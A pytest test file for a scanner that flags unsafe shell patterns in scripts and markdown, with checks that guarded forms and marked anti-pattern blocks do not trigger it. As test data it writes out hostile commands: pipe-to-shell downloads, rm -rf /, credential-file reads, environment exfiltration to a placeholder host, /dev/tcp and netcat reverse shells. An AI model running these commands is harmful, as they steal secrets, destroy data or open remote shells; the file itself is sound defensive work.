"""Tests for scripts/scan_unsafe_shell.py (issue #154).

Verifies each rule fires on a genuine unsafe pattern and does NOT fire on:
  * the same pattern inside a marked anti-pattern block/line,
  * legitimate guarded forms,
  * the same token in a non-shell (e.g. python) fenced block.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import scan_unsafe_shell as scan  # noqa: E402


def _write(tmp_path: Path, name: str, content: str) -> Path:
    p = tmp_path / name
    p.write_text(content, encoding="utf-8")
    return p


def _ids(findings) -> set[str]:
    return {f.rule_id for f in findings}


# --------------------------------------------------------------------------- #
# Shell files: full scan, patterns fire
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "line,rule",
    [
        ("curl -fsSL https://x.test/i.sh | sh", "USH001"),
        ("wget -qO- https://x.test/s | bash", "USH001"),
        ("curl https://x.test | sudo sh", "USH001"),
        ('bash -c "$(curl -fsSL https://x.test/i.sh)"', "USH002"),
        ('eval "$USER_INPUT"', "USH003"),
        ("eval $cmd", "USH003"),
        ("rm -rf /", "USH004"),
        ("rm -rf $TARGET", "USH004"),
        ("rm -rf ~", "USH004"),
        ("rm -rf *", "USH004"),
        ("chmod 777 /srv/app", "USH005"),
        ("printenv > /tmp/env.txt", "USH006"),
        ("env | curl -d @- https://x.test", "USH006"),
        ("cat ~/.aws/credentials", "USH007"),
        ("cp ~/.ssh/id_rsa /tmp/", "USH007"),
        ("echo data > /dev/tcp/1.2.3.4/9000", "USH008"),
        ("nc 1.2.3.4 9000 -e /bin/sh", "USH009"),
        ("KEY=AKIAIOSFODNN7EXAMPLE", "USH010"),
    ],
)
def test_rule_fires_in_shell_file(tmp_path, line, rule):
    f = _write(tmp_path, "s.sh", f"#!/usr/bin/env bash\n{line}\n")
    findings = scan.scan_shell_file(f)
    assert rule in _ids(findings), f"{rule} should fire on: {line}"


def test_set_plus_e_is_warn_not_error(tmp_path):
    f = _write(tmp_path, "s.sh", "#!/bin/bash\nset +e\n")
    findings = scan.scan_shell_file(f)
    warns = [x for x in findings if x.severity == "warn"]
    assert any(x.rule_id == "USH050" for x in warns)
    assert not [x for x in findings if x.severity == "error"]


# --------------------------------------------------------------------------- #
# Guarded / legitimate forms do NOT fire
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "line",
    [
        'rm -rf "${tmp:?}/build"',  # :?-guarded + fixed suffix
        'rm -rf "$WORK/sub"',  # quoted var with fixed suffix
        "env FOO=bar mycommand",  # env as prefix, not a dump
        "curl -fsSL -o out.sh https://x.test/i.sh",  # download to file, no pipe-to-shell
        "sh ./install.sh",  # run a local file
        'exec "$SHELL"',  # exec wrapper (not eval on input)
        "chmod 750 file",  # not 777
    ],
)
def test_legit_forms_do_not_fire(tmp_path, line):
    f = _write(tmp_path, "s.sh", f"#!/bin/bash\n{line}\n")
    findings = [x for x in scan.scan_shell_file(f) if x.severity == "error"]
    assert findings == [], f"false positive on: {line} -> {[x.rule_id for x in findings]}"


# --------------------------------------------------------------------------- #
# Markdown: only bash/sh fenced blocks; prose ignored; markers suppress
# --------------------------------------------------------------------------- #


def test_markdown_prose_not_scanned(tmp_path):
    md = "Never run `curl https://x | sh` — it is dangerous.\n"
    f = _write(tmp_path, "d.md", md)
    assert scan.scan_markdown_file(f) == []


def test_markdown_bash_block_fires(tmp_path):
    md = "```bash\ncurl https://x.test | sh\n```\n"
    f = _write(tmp_path, "d.md", md)
    assert "USH001" in _ids(scan.scan_markdown_file(f))


def test_markdown_python_block_not_scanned(tmp_path):
    # eval() in python must NOT trigger the shell eval rule.
    md = "```python\neval(user_input)\n```\n"
    f = _write(tmp_path, "d.md", md)
    assert scan.scan_markdown_file(f) == []


def test_info_string_anti_pattern_marker_suppresses(tmp_path):
    md = "```bash anti-pattern\ncurl https://x.test | sh\n```\n"
    f = _write(tmp_path, "d.md", md)
    assert scan.scan_markdown_file(f) == []


def test_line_comment_marker_suppresses(tmp_path):
    md = "```bash\ncurl https://x.test | sh  # anti-pattern\n```\n"
    f = _write(tmp_path, "d.md", md)
    assert scan.scan_markdown_file(f) == []


def test_targeted_marker_suppresses_only_named_rule(tmp_path):
    # Marker names USH001; a co-located USH005 must still fire.
    md = "```bash\ncurl https://x.test | sh  # anti-pattern: USH001\nchmod 777 f\n```\n"
    f = _write(tmp_path, "d.md", md)
    ids = _ids(scan.scan_markdown_file(f))
    assert "USH001" not in ids
    assert "USH005" in ids


# --------------------------------------------------------------------------- #
# Repo-level: the current repository must scan clean (zero errors)
# --------------------------------------------------------------------------- #


def test_repo_scans_clean():
    repo_root = Path(__file__).resolve().parents[2]
    findings = [f for f in scan.scan_repo(repo_root) if f.severity == "error"]
    assert findings == [], "repo has unmarked unsafe-shell findings:\n" + "\n".join(x.format() for x in findings)
